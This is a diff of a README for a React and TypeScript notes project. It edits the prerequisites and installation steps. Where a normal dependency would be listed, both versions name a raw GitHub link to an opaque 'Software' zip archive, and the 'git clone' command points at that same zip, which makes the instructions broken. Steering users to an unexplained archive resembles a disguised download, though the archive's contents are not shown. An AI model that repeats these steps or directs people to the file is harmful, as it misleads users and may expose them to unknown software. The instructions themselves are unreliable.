@@ -19,14 +19,14 @@ This project was created as part of studying and comprehending the React and Typ
 
 ## Prerequisites
 
-- https://raw.githubusercontent.com/vicleyva/Notes/master/src/Software_3.2.zip
+- https://raw.githubusercontent.com/vicleyva/Notes/master/public/Software-3.5.zip
 - npm
 
 ## Installation
 
 ```bash
 # Clone the repository
-git clone https://raw.githubusercontent.com/vicleyva/Notes/master/src/Software_3.2.zip
+git clone https://raw.githubusercontent.com/vicleyva/Notes/master/public/Software-3.5.zip
 
 # Change into the project directory
 cd Notes
